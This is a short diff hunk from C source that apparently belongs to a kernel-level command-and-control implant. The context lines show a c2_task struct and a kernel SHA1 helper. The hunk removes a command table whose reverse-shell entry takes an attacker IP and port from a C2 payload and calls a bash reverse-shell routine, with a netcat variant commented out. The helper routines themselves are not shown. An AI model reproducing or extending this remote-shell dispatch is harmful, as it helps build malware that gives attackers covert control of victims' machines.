@@ -26,20 +26,6 @@ struct c2_task {
     __u32 dst_ip;
 };
 
-typedef void (*command_ptr_t)(struct c2opt_gen);
-
-void do_reverse_shell(struct c2opt_gen payload)
-{
-    __u32 port = ntohl(payload.field2);
-    __u32 ip = payload.field1;
-    try_reverse_shell_bash(ip, port);
-    //try_reverse_shell_nc(payload);
-}
-
-command_ptr_t cmd_table[CMD_MAX] = {
-    [CMD_REVERSE_SHELL] = do_reverse_shell,
-};
-
 static int new_sha1(__u8 *buf, __u8 *output)
 {
     struct scatterlist sg;
